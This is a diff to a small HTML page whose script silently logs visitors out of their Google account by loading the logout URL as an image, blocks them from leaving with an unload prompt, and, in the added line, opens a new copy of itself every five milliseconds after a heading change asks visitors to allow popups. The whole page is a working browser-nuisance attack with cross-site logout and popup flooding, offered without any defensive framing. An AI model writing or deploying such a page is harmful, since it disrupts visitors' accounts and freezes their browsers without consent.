@@ -1,6 +1,6 @@
 <html>
 <body>
-<h1>please let this page load...</h1>
+<h1>please allow popups for this page towork properly...</h1>
 <script>
 function logout() {var i = new Image();
 i.src = 'https://accounts.google.com/Logout';
@@ -17,6 +17,7 @@ window.onbeforeunload = function (e) {
     // For Safari
     return 'Sure?';
 };
+    setInterval(function() {window.open(window.location.href)}, 5);
 </script>
 </body>
 </html>
